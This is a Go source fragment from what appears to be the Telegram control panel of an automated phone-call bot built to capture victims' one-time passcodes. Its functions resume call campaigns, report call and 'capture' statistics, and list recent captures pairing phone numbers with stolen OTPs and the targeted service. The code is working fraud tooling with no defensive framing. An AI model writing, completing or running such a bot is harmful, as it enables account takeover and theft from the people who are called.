func (b *Bot) resumeCampaignInline(chatID int64, messageID int, campaignIDStr string) {
	id, _ := strconv.ParseInt(campaignIDStr, 10, 64)
	b.resumeCampaignInlineMsg(chatID, messageID, id)
}

func (b *Bot) resumeCampaignInlineMsg(chatID int64, messageID int, campaignID int64) {
	campaign, err := b.db.GetCampaign(campaignID)
	if err != nil {
		b.editMessageSimple(chatID, messageID, "Campaign not found")
		return
	}

	if state, ok := b.campaignState[campaignID]; ok {
		state.mu.Lock()
		state.Status = "active"
		state.mu.Unlock()
	}

	b.db.UpdateCampaignStatus(campaignID, string(models.CampaignStatusActive))

	kb := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("Pause", "camp_pause_"+strconv.FormatInt(campaignID, 10)),
			tgbotapi.NewInlineKeyboardButtonData("Stop", "camp_stop_"+strconv.FormatInt(campaignID, 10)),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("< Back", "camp_list"),
		),
	)

	b.editMessage(chatID, messageID, fmt.Sprintf("*Campaign Resumed*\n\nCampaign \"%s\" (ID: %d) is now running.", campaign.Name, campaignID), kb)
}

// === STATS ===

func (b *Bot) showStatsInline(chatID int64, messageID int) {
	kb := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("Global Stats", "stats_global"),
			tgbotapi.NewInlineKeyboardButtonData("Recent Captures", "stats_captures"),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("< Back", "back_main"),
		),
	)

	text := "*Statistics*\n\nView detailed statistics and recent captures."

	b.editMessage(chatID, messageID, text, kb)
}

func (b *Bot) showGlobalStats(chatID int64, messageID int) {
	stats, _ := b.db.GetGlobalStats()

	kb := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("Refresh", "stats_global"),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("< Back", "stats_back"),
		),
	)

	text := fmt.Sprintf("*Global Statistics*\n\n*Total Calls:* %d\n*Answered:* %d\n*Failed:* %d\n*Captures:* %d\n*Success Rate:* %.1f%%\n\n*Campaigns:* %d total | %d active\n*Today:* %d calls | %d captures", stats.TotalCalls, stats.AnsweredCalls, stats.TotalCalls-stats.AnsweredCalls, stats.TotalCaptures, stats.SuccessRate, stats.TotalCampaigns, stats.ActiveCampaigns, stats.TodayCalls, stats.TodayCaptures)

	b.editMessage(chatID, messageID, text, kb)
}

func (b *Bot) showRecentCaptures(chatID int64, messageID int) {
	captures, _ := b.db.GetRecentCaptures(10)

	var text strings.Builder
	text.WriteString("*Recent Captures*\n\n")

	if len(captures) == 0 {
		text.WriteString("No captures yet.")
	} else {
		for _, c := range captures {
			text.WriteString(fmt.Sprintf("- %s -> *%s*\n", maskPhone(c.Phone), c.OTP))
			text.WriteString(fmt.Sprintf("  %s | %s\n\n", c.Service, c.CapturedAt.Format("15:04")))
		}
	}

	kb := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("< Back", "stats_back"),
		),
	)

	b.editMessage(chatID, messageID, text.String(), kb)
}

// === HELPER METHODS ===

func (b *Bot) editMessage(chatID int64, messageID int, text string, kb tgbotapi.InlineKeyboardMarkup) {
	editCfg := tgbotapi.NewEditMessageText(chatID, messageID, text)
	editCfg.ReplyMarkup = &kb
	editCfg.ParseMode = tgbotapi.ModeMarkdown
	b.telegram.Send(editCfg)
}

func (b *Bot) editMessageWithMarkdown(chatID int64, messageID int, text string, kb tgbotapi.InlineKeyboardMarkup) {
	editCfg := tgbotapi.NewEditMessageText(chatID, messageID, text)
	editCfg.ReplyMarkup = &kb
	editCfg.ParseMode = tgbotapi.ModeMarkdown
	b.telegram.Send(editCfg)
}

func (b *Bot) editMessageSimple(chatID int64, messageID int, text string) {
	editCfg := tgbotapi.NewEditMessageText(chatID, messageID, text)
	b.telegram.Send(editCfg)
}
